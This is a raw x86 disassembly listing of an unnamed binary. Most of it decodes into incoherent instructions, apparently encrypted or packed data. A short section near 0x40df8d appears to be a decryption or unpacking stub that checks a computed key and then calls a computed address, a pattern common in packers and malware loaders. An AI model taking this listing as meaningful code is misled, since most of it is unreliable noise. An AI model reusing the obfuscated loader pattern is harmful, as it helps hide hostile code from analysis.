  40da31:	jns    0x40da42
  40da33:	lahf   
  40da34:	retf   0x31f9
  40da37:	mov    dl,0xa8
  40da39:	jg     0x40da9a
  40da3b:	(bad)
  40da3f:	mov    ebp,0xae7e0281
  40da44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da45:	push   ebx
  40da46:	bound  esi,QWORD PTR [esi-0x62]
  40da49:	jmp    0xc6c0:0x86f25016
  40da50:	je     0x40da10
  40da52:	fadd   DWORD PTR [esi+0x41]
  40da55:	cli    
  40da56:	popa   
  40da57:	jge    0x40d9de
  40da59:	add    al,0xfc
  40da5b:	stos   DWORD PTR es:[edi],eax
  40da5c:	ficomp DWORD PTR ds:0x45e84135
  40da62:	xchg   ecx,eax
  40da63:	sub    al,ch
  40da65:	aas    
  40da66:	mov    DWORD PTR [edx],0x9c6f9319
  40da6c:	cmp    dl,dh
  40da6e:	mov    ecx,0xa8908e4f
  40da73:	mov    ds:0x7a150b83,eax
  40da78:	fstp   TBYTE PTR [edi]
  40da7a:	outs   dx,DWORD PTR ds:[esi]
  40da7b:	popa   
  40da7c:	ds jno 0x40da01
  40da7f:	or     DWORD PTR [ebx-0x688f5aed],edi
  40da85:	sub    al,dl
  40da87:	loopne 0x40dacd
  40da89:	dec    ecx
  40da8a:	mov    WORD PTR [edx-0x7f],ss
  40da8d:	pop    ds
  40da8e:	ins    DWORD PTR es:[edi],dx
  40da8f:	xchg   esi,eax
  40da90:	stc    
  40da91:	push   ebp
  40da92:	push   cs
  40da93:	cdq    
  40da94:	(bad)  
  40da95:	mov    DWORD PTR [ecx],ebp
  40da97:	leave  
  40da98:	mov    bl,0x1
  40da9a:	das    
  40da9b:	mov    al,ds:0x2d8c81fa
  40daa0:	and    ebp,DWORD PTR [ebx]
  40daa2:	hlt    
  40daa3:	add    dh,BYTE PTR [ecx]
  40daa5:	cmp    ah,bl
  40daa7:	dec    ebp
  40daa8:	dec    esp
  40daa9:	cdq    
  40daaa:	mov    ah,0x3f
  40daac:	push   ds
  40daad:	retf   
  40daae:	jmp    0x40ee:0x8557d533
  40dab5:	mov    WORD PTR [eax],cs
  40dab7:	add    esp,0xffffffc0
  40daba:	mov    eax,ds:0xa0230cbf
  40dabf:	shr    BYTE PTR [ebp-0x1b],cl
  40dac2:	imul   esp,ebp,0xeaa446dd
  40dac8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dac9:	add    al,0x2
  40dacb:	shl    BYTE PTR [edi+ebx*1-0x382d276a],0x57
  40dad3:	inc    ebp
  40dad4:	lahf   
  40dad5:	icebp  
  40dad6:	into   
  40dad7:	cmp    eax,0x20b9a2a5
  40dadc:	jno    0x40db18
  40dade:	or     dh,0xe4
  40dae1:	dec    eax
  40dae2:	bound  edi,QWORD PTR [eax]
  40dae4:	mul    BYTE PTR [esi-0x44711e67]
  40daea:	xchg   cx,ax
  40daec:	test   eax,0x6d35a99a
  40daf1:	inc    edi
  40daf2:	mov    ebx,DWORD PTR [esi]
  40daf4:	cmp    dh,BYTE PTR [edi-0x6fb7b139]
  40dafa:	sahf   
  40dafb:	fwait
  40dafc:	call   0x3c3f:0x91b9aac4
  40db03:	cmp    eax,0xa8525b4c
  40db08:	ja     0x40dabb
  40db0a:	call   0xf1bf:0x17cd5428
  40db11:	pushf  
  40db12:	push   es
  40db13:	cmp    BYTE PTR [ecx],dh
  40db15:	cmp    bl,BYTE PTR [ebp+0x7f]
  40db18:	inc    ebx
  40db19:	mov    bh,BYTE PTR [edx]
  40db1b:	pop    ss
  40db1c:	jmp    0x17fe:0xb3c81d11
  40db23:	sbb    bh,0x4f
  40db26:	push   edx
  40db27:	push   edi
  40db28:	leave  
  40db29:	cmp    ebx,edi
  40db2b:	outs   dx,BYTE PTR ds:[esi]
  40db2c:	sbb    dl,ah
  40db2e:	and    BYTE PTR [ebp-0x3c],cl
  40db31:	imul   edi,DWORD PTR [edi+0x656a4f6a],0xffffff98
  40db38:	addr16 xchg edi,eax
  40db3a:	out    0x7e,eax
  40db3c:	call   0xbe3e717
  40db41:	lea    esp,[eax-0x3b369068]
  40db47:	pop    es
  40db48:	cmp    DWORD PTR [edx],ebp
  40db4a:	jno    0x40dacf
  40db4c:	(bad)  
  40db4d:	popa   
  40db4e:	adc    ecx,ebp
  40db50:	push   esp
  40db51:	shl    ebx,1
  40db53:	iret   
  40db54:	pop    eax
  40db55:	imul   ebx,esp,0xfffffff9
  40db58:	(bad)  
  40db59:	mov    eax,ds:0x138d8ab9
  40db5e:	test   al,0x1b
  40db60:	add    BYTE PTR [esi],dh
  40db62:	xchg   esp,eax
  40db63:	cmp    al,0x9f
  40db65:	fs aad 0xf3
  40db68:	idiv   esp
  40db6a:	sbb    eax,0x7bf17fcd
  40db6f:	out    0xb7,eax
  40db71:	or     eax,0xdc130986
  40db76:	jno    0x40db8b
  40db78:	xchg   edi,eax
  40db79:	adc    cl,0xc0
  40db7c:	loop   0x40dba9
  40db7e:	clc    
  40db7f:	xor    DWORD PTR [ebx],ebx
  40db81:	add    BYTE PTR [ecx],ch
  40db83:	sub    edi,DWORD PTR [eax+0x1b]
  40db86:	call   0x5b1f:0x2eaf62fa
  40db8d:	mov    edi,0xdea673c
  40db92:	dec    ebx
  40db93:	ds adc eax,0x2900b160
  40db99:	stc    
  40db9a:	jl     0x40db20
  40db9c:	cmp    edx,DWORD PTR [eax+0x7d176051]
  40dba2:	fsub   st,st(3)
  40dba4:	and    ch,BYTE PTR [ecx]
  40dba6:	mov    ah,dl
  40dba8:	add    BYTE PTR [edi],0xfd
  40dbab:	repz ror BYTE PTR [esi],cl
  40dbae:	sbb    BYTE PTR [esp+eax*2],cl
  40dbb1:	jle    0x40dbfb
  40dbb3:	lds    esp,FWORD PTR ss:[eax]
  40dbb6:	mov    bh,0x87
  40dbb8:	fcomp  DWORD PTR [edi-0xe]
  40dbbb:	outs   dx,BYTE PTR ds:[esi]
  40dbbc:	xor    ch,BYTE PTR [edx-0x29de4455]
  40dbc2:	out    dx,eax
  40dbc3:	fnstenv [edx+0x2b]
  40dbc6:	mov    DWORD PTR [edi+0x21bc5742],esi
  40dbcc:	xor    ecx,edx
  40dbce:	mov    bh,0x51
  40dbd0:	pusha  
  40dbd1:	sub    al,al
  40dbd3:	or     eax,0x92b07f5d
  40dbd8:	sbb    eax,0xc1fc2b98
  40dbdd:	push   ebx
  40dbde:	outs   dx,DWORD PTR ds:[esi]
  40dbdf:	ss rsm 
  40dbe2:	scas   eax,DWORD PTR es:[edi]
  40dbe3:	jno    0x40dc41
  40dbe5:	sbb    BYTE PTR gs:[ebx],0x60
  40dbe9:	push   ss
  40dbea:	int    0x5
  40dbec:	cli    
  40dbed:	int3   
  40dbee:	jmp    0x118:0xa568a00a
  40dbf5:	sbb    ebp,DWORD PTR [ebx]
  40dbf7:	(bad)  
  40dbf9:	pusha  
  40dbfa:	dec    edx
  40dbfb:	lock xchg DWORD PTR [ebx+0x4e007629],ebx
  40dc02:	repz jl 0x40dbe8
  40dc05:	inc    ebp
  40dc06:	add    BYTE PTR [esi+0x3fd11868],0x11
  40dc0d:	(bad)  
  40dc0e:	dec    DWORD PTR [esi]
  40dc10:	sub    ebx,DWORD PTR [ebx+0x37f943de]
  40dc16:	pop    ebp
  40dc17:	inc    ebp
  40dc18:	dec    esp
  40dc19:	adc    al,0x98
  40dc1b:	dec    ebx
  40dc1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc1d:	lods   al,BYTE PTR ds:[esi]
  40dc1e:	jb     0x40dc2a
  40dc20:	mov    al,0xcf
  40dc22:	lods   al,BYTE PTR ds:[esi]
  40dc23:	pop    edx
  40dc24:	cmp    BYTE PTR [ecx+0xa],0xae
  40dc28:	mov    al,ds:0x307bd3a8
  40dc2d:	sahf   
  40dc2e:	jecxz  0x40dc32
  40dc30:	adc    al,0x6c
  40dc32:	clc    
  40dc33:	xlat   BYTE PTR ds:[ebx]
  40dc34:	cli    
  40dc35:	cli    
  40dc36:	pop    ecx
  40dc37:	push   es
  40dc38:	and    al,0xcf
  40dc3a:	rcr    edx,1
  40dc3c:	cmp    edx,DWORD PTR [edi-0x63e88754]
  40dc42:	out    dx,al
  40dc43:	in     al,0x61
  40dc45:	xchg   ebx,eax
  40dc46:	ins    BYTE PTR es:[edi],dx
  40dc47:	out    0xdf,al
  40dc49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc4a:	jmp    0x40dc78
  40dc4c:	shl    DWORD PTR [edx+0xc],1
  40dc4f:	es pop ds
  40dc51:	dec    edx
  40dc52:	out    dx,al
  40dc53:	int3   
  40dc54:	add    eax,0xabb1b7bd
  40dc59:	jp     0x40dc8e
  40dc5b:	or     eax,0x847f9cca
  40dc60:	xor    DWORD PTR ds:0x558bf949,esi
  40dc66:	or     BYTE PTR [ebx+0x1be9dc7d],cl
  40dc6c:	add    eax,DWORD PTR [eax]
  40dc6e:	add    dl,dh
  40dc70:	cmp    al,0x15
  40dc72:	adc    al,0x31
  40dc74:	aad    0xf3
  40dc76:	fcom   DWORD PTR [eax*8-0x23b13768]
  40dc7d:	in     al,0xaf
  40dc7f:	xor    eax,0x7d7e7e9a
  40dc84:	jge    0x40dd04
  40dc86:	jle    0x40dccf
  40dc88:	out    0x2e,al
  40dc8a:	xchg   esi,eax
  40dc8b:	or     eax,0xf00d658
  40dc90:	loopne 0x40dcc9
  40dc92:	es out dx,al
  40dc94:	rol    DWORD PTR [bx+di+0x3],cl
  40dc98:	cmp    al,0xfb
  40dc9a:	or     edx,esp
  40dc9c:	iret   
  40dc9d:	and    al,0x40
  40dc9f:	inc    eax
  40dca0:	int    0x88
  40dca2:	adc    eax,0x4b35635a
  40dca7:	mov    ah,0xef
  40dca9:	add    eax,0xceed0304
  40dcae:	xchg   ebp,eax
  40dcaf:	mov    dl,BYTE PTR [edx+0xce10bfe]
  40dcb5:	dec    eax
  40dcb6:	mul    DWORD PTR [ecx+0x1291748e]
  40dcbc:	push   ebp
  40dcbd:	jmp    0x40dd26
  40dcbf:	and    al,0xe4
  40dcc1:	adc    eax,0x1967e9ff
  40dcc6:	popa   
  40dcc7:	cmp    ecx,esi
  40dcc9:	ins    DWORD PTR es:[edi],dx
  40dcca:	jecxz  0x40dd16
  40dccc:	jnp    0x40dc87
  40dcce:	test   al,0x97
  40dcd0:	(bad)  
  40dcd1:	xor    edx,edi
  40dcd3:	test   al,0xe
  40dcd5:	pop    ds
  40dcd6:	in     al,0x16
  40dcd8:	and    al,0xf1
  40dcda:	jae    0x40dcc3
  40dcdc:	adc    eax,0x34320559
  40dce1:	xchg   edx,eax
  40dce2:	jb     0x40dca3
  40dce4:	jg     0x40dc74
  40dce6:	shr    DWORD PTR [ebp+0x43],1
  40dce9:	aaa    
  40dcea:	pop    edi
  40dceb:	int3   
  40dcec:	sahf   
  40dced:	in     al,0xb8
  40dcef:	pop    eax
  40dcf0:	dec    ebp
  40dcf1:	mov    edi,0xb2c70f83
  40dcf6:	inc    ecx
  40dcf7:	mov    esi,0x92d9e214
  40dcfc:	adc    DWORD PTR [eax+0x43],edx
  40dcff:	sbb    al,cl
  40dd01:	or     al,0x2c
  40dd03:	dec    esi
  40dd04:	push   ebx
  40dd05:	mov    edi,0x6dd1d94d
  40dd0a:	adc    al,0x5e
  40dd0c:	pop    ss
  40dd0d:	(bad)  
  40dd0e:	mov    eax,es:0xa7a42f73
  40dd14:	pop    esp
  40dd15:	cmp    al,0x7e
  40dd17:	cmp    eax,0xe5a8230a
  40dd1c:	or     al,0x32
  40dd1e:	adc    dl,bh
  40dd20:	xchg   ebx,eax
  40dd21:	inc    ecx
  40dd22:	mov    bh,0xa0
  40dd24:	mov    ebp,0x9192b4fd
  40dd29:	adc    ch,BYTE PTR [ebx]
  40dd2b:	inc    edi
  40dd2c:	sub    al,BYTE PTR [edi-0x48]
  40dd2f:	mov    dl,0x8f
  40dd31:	xchg   edi,eax
  40dd32:	loope  0x40dd5b
  40dd34:	ret    
  40dd35:	les    eax,FWORD PTR [eax+0x6a]
  40dd38:	stos   BYTE PTR es:[edi],al
  40dd39:	(bad)  
  40dd3a:	xchg   edx,eax
  40dd3b:	leave  
  40dd3c:	mul    BYTE PTR [ebp+ebp*2-0x4ccac25d]
  40dd43:	cmp    ch,0xbf
  40dd46:	shl    edx,0x66
  40dd49:	aas    
  40dd4a:	outs   dx,BYTE PTR ds:[esi]
  40dd4b:	mov    eax,edi
  40dd4d:	test   BYTE PTR [eax-0x25ea87b6],ah
  40dd53:	stos   DWORD PTR es:[edi],eax
  40dd54:	xor    bh,0xf9
  40dd57:	jle    0x40dd67
  40dd59:	or     eax,0x8b32e8bb
  40dd5e:	sub    edx,ebx
  40dd60:	repz into 
  40dd62:	mov    eax,0x7a6030dc
  40dd67:	out    0xa9,al
  40dd69:	(bad)  
  40dd6b:	wbinvd 
  40dd6d:	test   BYTE PTR [edi-0x3dde906d],ah
  40dd73:	fld    TBYTE PTR [eax]
  40dd75:	sbb    eax,0x9a933ea4
  40dd7a:	adc    eax,0x133e25c9
  40dd7f:	lods   al,BYTE PTR ds:[esi]
  40dd80:	and    ch,cl
  40dd82:	pop    ds
  40dd83:	ins    BYTE PTR es:[edi],dx
  40dd84:	pop    es
  40dd85:	aas    
  40dd86:	arpl   ax,si
  40dd88:	sbb    al,cl
  40dd8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd8b:	(bad)  ds:0x681208df
  40dd91:	inc    eax
  40dd92:	jo     0x40dd86
  40dd94:	jnp    0x40ddb9
  40dd96:	inc    ecx
  40dd97:	iret   
  40dd98:	jg     0x40ddab
  40dd9a:	and    dl,ah
  40dd9c:	aaa    
  40dd9d:	inc    edi
  40dd9e:	push   edx
  40dd9f:	mov    BYTE PTR [ecx],0xb2
  40dda2:	xchg   BYTE PTR [ebx+edx*4+0x4b],al
  40dda6:	pop    edi
  40dda7:	pop    esi
  40dda8:	daa    
  40dda9:	mov    DWORD PTR [ecx],eax
  40ddab:	shl    DWORD PTR [esi+0x35],0x21
  40ddaf:	or     esi,DWORD PTR [esi+esi*8]
  40ddb2:	fwait
  40ddb3:	dec    edx
  40ddb4:	(bad)  
  40ddb5:	call   0xfa3d4068
  40ddba:	nop
  40ddbb:	imul   esp,DWORD PTR [ebp-0x53],0x368d015b
  40ddc2:	adc    BYTE PTR [eax],bl
  40ddc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddc5:	xor    eax,0x5cb5d6eb
  40ddca:	pop    esi
  40ddcb:	xor    al,0x16
  40ddcd:	xor    eax,0x36f37f0a
  40ddd2:	loop   0x40de50
  40ddd4:	repz xor al,0x19
  40ddd7:	iret   
  40ddd8:	jmp    DWORD PTR [eax]
  40ddda:	cli    
  40dddb:	and    edi,DWORD PTR [ecx+0x3d9e2b20]
  40dde1:	sub    BYTE PTR [ecx],bh
  40dde3:	jne    0x40ddd0
  40dde5:	cmp    al,BYTE PTR [esi-0x540a9626]
  40ddeb:	std    
  40ddec:	push   0x7d
  40ddee:	xor    eax,DWORD PTR [ebp-0x8]
  40ddf1:	xchg   ebx,eax
  40ddf2:	pop    esp
  40ddf3:	push   ss
  40ddf4:	fwait
  40ddf5:	shl    BYTE PTR [eax+esi*8-0x77],0x87
  40ddfa:	repnz outs dx,BYTE PTR ds:[esi]
  40ddfc:	push   ebp
  40ddfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddfe:	lods   al,BYTE PTR ds:[esi]
  40ddff:	hlt    
  40de00:	aas    
  40de01:	push   es
  40de02:	shr    BYTE PTR [edi+edi*1-0x5f],0xd7
  40de07:	imul   edx,DWORD PTR ds:0x17b32852,0xd3c16dd6
  40de11:	pop    eax
  40de12:	xchg   ch,ch
  40de14:	test   al,0x3b
  40de16:	and    esi,DWORD PTR [ebx]
  40de18:	pop    ebx
  40de19:	test   DWORD PTR [ebp-0x5ab4df08],ecx
  40de1f:	cmp    eax,0xab92cba7
  40de24:	adc    al,0x95
  40de26:	adc    eax,0x7b73d152
  40de2b:	pmaxsw mm0,mm3
  40de2e:	fwait
  40de2f:	or     bl,BYTE PTR [ebx+0x5d40c3e2]
  40de35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de36:	mov    ?,WORD PTR [edi-0x35]
  40de39:	outs   dx,DWORD PTR ds:[esi]
  40de3a:	mov    BYTE PTR [ecx-0xc],al
  40de3d:	add    DWORD PTR [edi-0x49],esp
  40de40:	shr    BYTE PTR [eax-0x7a4d6c5c],1
  40de46:	in     eax,dx
  40de47:	aad    0x4c
  40de49:	into   
  40de4a:	jmp    0x74e9bc58
  40de4f:	aas    
  40de50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de51:	cdq    
  40de52:	lds    ebx,FWORD PTR [eax]
  40de54:	ss ret 
  40de56:	(bad)  
  40de57:	jmp    0x535c:0x3520dcf4
  40de5e:	int3   
  40de5f:	pop    ebp
  40de60:	loop   0x40ddee
  40de62:	ja     0x40de7f
  40de64:	push   esp
  40de65:	fdivr  QWORD PTR [ecx+0x44]
  40de68:	inc    ecx
  40de69:	rcr    DWORD PTR [ebp+0x42],cl
  40de6c:	pop    ebp
  40de6d:	cdq    
  40de6e:	call   0xc762:0xfa218b0d
  40de75:	inc    ebx
  40de76:	cs and bl,ch
  40de79:	int3   
  40de7a:	dec    ecx
  40de7b:	enter  0xf44f,0x5f
  40de7f:	stos   DWORD PTR es:[edi],eax
  40de80:	ja     0x40dee1
  40de82:	leave  
  40de83:	xchg   ebp,eax
  40de84:	sub    DWORD PTR [esi-0x67],ebx
  40de87:	mov    bh,BYTE PTR [ebp-0x39e80213]
  40de8d:	fisubr DWORD PTR [edi-0x11]
  40de90:	cmp    BYTE PTR [ecx],dl
  40de92:	inc    ecx
  40de93:	mov    ds:0xded2cece,al
  40de98:	jmp    0x40defa
  40de9a:	outs   dx,DWORD PTR ds:[esi]
  40de9b:	mov    dl,0xfb
  40de9d:	in     eax,dx
  40de9e:	add    eax,0x9461ed87
  40dea3:	and    bl,BYTE PTR [esi]
  40dea5:	mov    dl,0xba
  40dea7:	push   esi
  40dea8:	stos   BYTE PTR es:[edi],al
  40dea9:	xlat   BYTE PTR ds:[ebx]
  40deaa:	push   edx
  40deab:	xchg   edx,eax
  40deac:	xor    BYTE PTR [esi-0x2f],ch
  40deaf:	inc    ebp
  40deb0:	sbb    al,0xea
  40deb2:	retf   0xcb24
  40deb5:	(bad)  
  40deb6:	pop    esi
  40deb7:	mul    BYTE PTR [ebx+0x55]
  40deba:	stc    
  40debb:	jmp    0x5a03:0xe3001fe6
  40dec2:	pop    esi
  40dec3:	test   al,0xa0
  40dec5:	add    ch,ch
  40dec7:	dec    eax
  40dec8:	inc    eax
  40dec9:	dec    edx
  40deca:	dec    esi
  40decb:	and    DWORD PTR [esi],eax
  40decd:	out    dx,eax
  40dece:	pslld  mm4,QWORD PTR [esi]
  40ded1:	jnp    0x40de5d
  40ded3:	lock add dl,BYTE PTR [esi+esi*4+0x43]
  40ded8:	shl    BYTE PTR [eax],1
  40deda:	dec    eax
  40dedb:	push   ds
  40dedc:	call   0x10200c32
  40dee1:	das    
  40dee2:	mov    ebx,0xd52433f
  40dee7:	pop    eax
  40dee8:	repz es dec edx
  40deeb:	sahf   
  40deec:	xor    ebx,ebx
  40deee:	repnz pop ecx
  40def0:	jae    0x40dea1
  40def2:	aaa    
  40def3:	test   al,0x24
  40def5:	push   0x6f96ba3c
  40defa:	sub    al,0x62
  40defc:	shl    dh,0xba
  40deff:	clc    
  40df00:	js     0x40df32
  40df02:	jle    0x40df73
  40df04:	fisubr DWORD PTR [ebp+0x47e3f360]
  40df0a:	test   WORD PTR [edi-0x62d34cbe],bp
  40df11:	in     al,dx
  40df12:	jb     0x40df4b
  40df14:	ret    0x4215
  40df17:	out    0xb2,eax
  40df19:	rcl    DWORD PTR [eax-0x6386e26b],1
  40df1f:	sahf   
  40df20:	mov    al,0xe8
  40df22:	repz push 0xffffffac
  40df25:	sahf   
  40df26:	push   esi
  40df27:	xor    al,0xde
  40df29:	sbb    eax,0xf2d58a4a
  40df2e:	arpl   WORD PTR [ebx-0x5893c98d],si
  40df34:	fisubr WORD PTR [ebp-0x7797c5e8]
  40df3a:	cmp    al,0x93
  40df3c:	or     eax,0x6b5ee5c0
  40df41:	adc    esi,DWORD PTR [ebx+0x75]
  40df44:	out    dx,al
  40df45:	mov    dl,0xe7
  40df47:	jge    0x40dfa1
  40df49:	inc    edx
  40df4a:	or     BYTE PTR [ebp+0x1e],dh
  40df4d:	push   ecx
  40df4e:	jae    0x40deef
  40df50:	std    
  40df51:	mov    eax,0x97be3318
  40df56:	mov    ds:0x4c7221a1,eax
  40df5b:	ror    DWORD PTR [ebp+0x22],0x11
  40df5f:	test   edx,0x10b1b28c
  40df65:	out    0x6f,al
  40df67:	cmp    BYTE PTR [eax+0xe0fe459],cl
  40df6d:	jle    0x40dfad
  40df6f:	cmp    ebp,0x6d203740
  40df75:	(bad)  
  40df76:	fmul   st(3),st
  40df78:	pusha  
  40df79:	enter  0xcec7,0x47
  40df7d:	fsubp  st(4),st
  40df7f:	add    al,0xd2
  40df81:	xor    dl,BYTE PTR ds:0x9be26315
  40df87:	sbb    ebx,DWORD PTR [ebx+ebx*4-0x77]
  40df8b:	add    al,0x97
  40df8d:	mov    eax,DWORD PTR [ebp-0x18]
  40df90:	mov    edx,DWORD PTR [ebp+0x8]
  40df93:	xor    eax,ecx
  40df95:	lea    eax,[eax+edx*1+0x32729b]
  40df9c:	mov    DWORD PTR [ebp+0x8],eax
  40df9f:	mov    eax,DWORD PTR [ebp-0x18]
  40dfa2:	mov    edx,DWORD PTR [ebp+0x14]
  40dfa5:	xor    eax,ecx
  40dfa7:	add    eax,esi
  40dfa9:	imul   eax,DWORD PTR [edx]
  40dfac:	mov    edx,DWORD PTR [ebp-0x4]
  40dfaf:	xor    edx,ecx
  40dfb1:	mov    ecx,DWORD PTR [ebp+0x8]
  40dfb4:	lea    ecx,[edx+ecx*1+0x32729b]
  40dfbb:	cmp    ecx,eax
  40dfbd:	jne    0x40d5f9
  40dfc3:	mov    ebx,esi
  40dfc5:	jmp    0x40dfcf
  40dfca:	mov    ebx,0x32729b
  40dfcf:	mov    eax,DWORD PTR [ebp-0x4]
  40dfd2:	xor    eax,0x7510854
  40dfd7:	add    eax,ebx
  40dfd9:	mov    DWORD PTR [ebp-0xc],eax
  40dfdc:	xor    ebx,ebx
  40dfde:	lea    eax,[ebp-0x10]
  40dfe1:	add    ebx,DWORD PTR [eax]
  40dfe3:	call   ebx
  40dfe5:	xor    ebx,ebx
  40dfe7:	inc    ebx
  40dfe8:	cmp    DWORD PTR [ebp+0x10],ebx
  40dfeb:	je     0x40e009
  40dff1:	xchg   edx,eax
  40dff2:	push   0xa
  40dff4:	pop    ecx
  40dff5:	push   0x4
  40dff7:	pop    ebx
  40dff8:	inc    ebx
  40dff9:	xchg   ebx,ecx
  40dffb:	sub    ebx,ecx
  40dffd:	xchg   ebx,ecx
  40dfff:	dec    ecx
  40e000:	mov    eax,DWORD PTR [ebp-0x1c]
  40e003:	imul   eax,ecx
  40e006:	add    esp,eax
  40e008:	xchg   edx,eax
  40e009:	push   eax
  40e00a:	xor    ebx,ebx
  40e00c:	mov    edx,esp
  40e00e:	dec    edx
  40e00f:	inc    ebx
  40e010:	add    ebx,DWORD PTR [edx+ebx*1]
  40e013:	jmp    0x40e333
  40e018:	lods   al,BYTE PTR ds:[esi]
  40e019:	and    bl,bl
  40e01b:	xchg   esp,eax
  40e01c:	jno    0x40e073
  40e01e:	jno    0x40e042
  40e020:	add    cl,cl
  40e022:	cs (bad) 
  40e025:	out    0x91,eax
  40e027:	in     eax,dx
  40e028:	xor    BYTE PTR [ecx+0x7d7d7e7e],bl
  40e02e:	jle    0x40e0ae
  40e030:	jo     0x40dfbe
  40e032:	mov    dl,0xb4
  40e034:	fidivr WORD PTR [ebx-0x686c6a92]
  40e03a:	dec    eax
  40e03b:	(bad)  
  40e03c:	jae    0x40dfc4
  40e03e:	mov    bl,0xe0
  40e040:	sbb    edx,eax
  40e042:	aas    
  40e043:	fidiv  DWORD PTR [ebp+0x25558ba7]
  40e049:	imul   ebx,DWORD PTR [eax-0x1a8fd414],0x726d7378
  40e053:	iret   
  40e054:	xchg   esi,eax
  40e055:	mov    cl,0xab
  40e057:	sub    cl,0x22
  40e05a:	mov    ds:0x746799b4,al
  40e05f:	inc    ebx
  40e060:	sbb    al,0xd5
  40e062:	dec    esp
  40e063:	out    0x3e,al
  40e065:	xchg   ebx,eax
  40e066:	add    BYTE PTR [edi+0x16c279ad],bh
  40e06c:	jmp    0x54e3eb26
  40e071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e072:	pop    ecx
  40e073:	sbb    al,0xd8
  40e075:	mov    dh,0x6
  40e077:	call   0x5c49:0x40d50f20
  40e07e:	ss jae 0x40e00c
  40e081:	fdiv   DWORD PTR [edx+0x2c]
  40e084:	loop   0x40e09b
  40e086:	fisubr DWORD PTR [ecx+0x66]
  40e089:	mov    ah,0xb2
  40e08b:	push   ebx
  40e08c:	outs   dx,DWORD PTR ds:[esi]
  40e08d:	jmp    0x91275633
  40e092:	mov    bh,0xa6
  40e094:	mov    dl,0x8b
  40e096:	loope  0x40e052
  40e098:	call   0xded0c9df
  40e09d:	cmp    BYTE PTR [ebx+ebp*1],dh
  40e0a0:	jo     0x40e113
  40e0a2:	pmaxub mm1,QWORD PTR [ebx]
  40e0a5:	iret   
  40e0a6:	sbb    BYTE PTR [ebp-0x72cffcbe],0xd
  40e0ad:	xor    eax,0xf71c235b
  40e0b2:	ins    BYTE PTR es:[edi],dx
  40e0b3:	call   eax
  40e0b5:	push   eax
  40e0b6:	mov    edx,0xf102d6eb
  40e0bb:	sbb    al,0xe8
  40e0bd:	mov    edi,0x3099a570
  40e0c2:	push   ds
  40e0c3:	cmp    DWORD PTR [eax],0x3f
  40e0c6:	xchg   esp,eax
  40e0c7:	sub    esp,DWORD PTR [ebx]
  40e0c9:	aas    
  40e0ca:	cmp    DWORD PTR [ecx-0xc],edx
  40e0cd:	icebp  
  40e0ce:	ss mov esi,0xc74f9246
  40e0d4:	push   ss
  40e0d5:	sbb    DWORD PTR [edx],edi
  40e0d7:	stos   DWORD PTR es:[edi],eax
  40e0d8:	sbb    bl,BYTE PTR [edi]
  40e0da:	cdq    
  40e0db:	(bad)  
  40e0dc:	cmp    bh,BYTE PTR [eax-0x17]
  40e0df:	outs   dx,BYTE PTR ds:[esi]
  40e0e0:	xchg   ebx,eax
  40e0e1:	push   es
  40e0e2:	test   BYTE PTR [ebx+0xa],dh
  40e0e5:	jge    0x40e0aa
  40e0e7:	jnp    0x40e075
  40e0e9:	inc    esi
  40e0ea:	aaa    
  40e0eb:	lahf   
  40e0ec:	(bad)  
  40e0ed:	cmp    esp,ebp
  40e0ef:	xor    eax,0x91651111
  40e0f4:	fcomp  st(2)
  40e0f6:	mov    eax,gs:0x7d181094
  40e0fc:	mov    WORD PTR [ecx+0x7],?
  40e0ff:	std    
  40e100:	out    0x2c,al
  40e102:	jno    0x40e12e
  40e104:	rcr    ebp,cl
  40e106:	ja     0x40e0c7
  40e108:	gs out 0x2b,al
  40e10b:	rcl    BYTE PTR [eax+0x7f597607],0x78
  40e112:	clc    
  40e113:	pop    ss
  40e114:	and    DWORD PTR [ebx+0x4978eba5],edi
  40e11a:	push   0xffffff91
  40e11c:	xchg   ecx,eax
  40e11d:	cmp    bh,BYTE PTR ds:0x42bff1dd
  40e123:	mov    ch,0xf9
  40e125:	adc    BYTE PTR [edx-0x4370b7da],bh
  40e12b:	lahf   
  40e12c:	repz les edx,FWORD PTR [edx+ecx*4+0x2bb67737]
  40e134:	fisub  WORD PTR [ebx-0x37]
  40e137:	call   DWORD PTR [ecx]
  40e13a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e13b:	cld    
  40e13c:	icebp  
  40e13d:	pop    esp
  40e13e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e13f:	pop    es
  40e140:	hlt    
  40e141:	retf   
  40e142:	add    edx,0xfffffff2
  40e145:	mov    edi,ecx
  40e147:	cs xor bl,ah
  40e14a:	outs   dx,DWORD PTR fs:[esi]
  40e14c:	leave  
  40e14d:	xor    DWORD PTR ds:0x65313ed4,0xffffffdd
  40e154:	mov    WORD PTR [ecx+0x43],ds
  40e157:	sbb    eax,0x5a889e17
  40e15c:	sbb    ah,bh
  40e15e:	stos   BYTE PTR es:[edi],al
  40e15f:	cmp    BYTE PTR [ebx],0xad
  40e162:	add    al,0x88
  40e164:	mov    bh,0xc7
  40e166:	cmp    al,0x68
  40e168:	cmp    al,0x81
  40e16a:	inc    DWORD PTR [ebx-0x1c]
  40e16d:	test   DWORD PTR [eax-0x33],0x9b6ef75c
  40e174:	leave  
  40e175:	outs   dx,BYTE PTR ds:[esi]
  40e176:	or     DWORD PTR [esi],eax
  40e178:	cs fwait
  40e17a:	cmp    ah,BYTE PTR [eax+0x63a2872c]
  40e180:	jge    0x40e1ce
  40e182:	mov    ebp,0xddb4877b
  40e187:	xor    eax,0xe2a73d59
  40e18c:	jo     0x40e190
  40e18e:	cmc    
  40e18f:	cmp    ch,BYTE PTR [ebx-0x6b]
  40e192:	out    0xa4,eax
  40e194:	cwde   
  40e195:	push   es
  40e196:	sbb    DWORD PTR ds:0x4d35907,ebx
  40e19c:	mov    ds:0xecf0350d,al
  40e1a1:	(bad)  
  40e1a3:	jne    0x40e1bf
  40e1a5:	popa   
  40e1a6:	mov    WORD PTR [ebx-0x5a11c78c],es
  40e1ac:	mov    ch,0xd7
